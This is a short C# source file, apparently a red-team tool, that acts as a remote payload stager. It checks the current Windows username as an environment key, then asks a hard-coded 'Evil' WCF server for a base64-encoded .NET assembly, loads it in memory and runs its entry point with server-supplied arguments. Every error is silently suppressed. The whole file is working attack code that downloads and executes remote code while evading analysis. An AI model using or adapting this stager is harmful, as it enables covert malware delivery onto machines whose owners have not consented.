using System;
using System.ServiceModel;
using System.Reflection;
using System.IO;
using System.Linq;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    static void Main(string[] args)
    {
        try
        {
            var binding = new BasicHttpBinding();
            binding.MaxReceivedMessageSize = Int32.MaxValue;
            var channel = new ChannelFactory<Interface2>(binding, "http://192.168.55.250:8080/Evil");
            var client = channel.CreateChannel();
            string logic = "";

            //Arvanaghi/CheckPlease match username example
            if (System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToLower().Equals(string.Join(" ", "username").ToLower()))
            {
                logic = "1";
            }
            else
            {
                logic = "0";
            }

            //Return source from server
            String[] source = client.b64AssemblyLogic(logic);            

            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);

            //Args
            object[] cmd = source.Skip(1).ToArray();

            //Read the bytes from the binary file
            MemoryStream ms = new MemoryStream(decode);
            BinaryReader br = new BinaryReader(ms);
            byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
            ms.Close();
            br.Close();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { cmd });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        catch
        { }
    }
}

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] b64AssemblyLogic(string myLogic);
}

